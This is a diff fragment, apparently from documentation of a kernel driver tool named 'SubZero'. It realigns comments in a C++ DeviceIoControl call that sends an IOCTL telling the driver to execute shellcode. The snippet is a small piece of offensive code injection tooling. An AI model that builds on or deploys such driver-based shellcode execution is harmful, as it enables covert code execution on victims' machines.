@@ -572,9 +572,9 @@ The shellcode injection handler works as you expect - The DLL opens a handle to 
     DWORD bytesReturned = 0;
     if (!::DeviceIoControl(
             deviceAutoHandle.get(),                                         // device to be queried
-            IOCTL_SUBZERO_EXECUTE_SHELLCODE,                                 // operation to perform
-            inputBuffer.get(), bufferSize,                                     // input buffer
-            outputBuffer.get(), shellcodeDataStruct->ReturnedDataMaxSize,     // output buffer
+            IOCTL_SUBZERO_EXECUTE_SHELLCODE,                                // operation to perform
+            inputBuffer.get(), bufferSize,                                  // input buffer
+            outputBuffer.get(), shellcodeDataStruct->ReturnedDataMaxSize,   // output buffer
             &bytesReturned,                                                 // # bytes returned
             nullptr))
             throw std::runtime_error(DEBUG_TEXT("[-] DeviceIoControl Failed"));
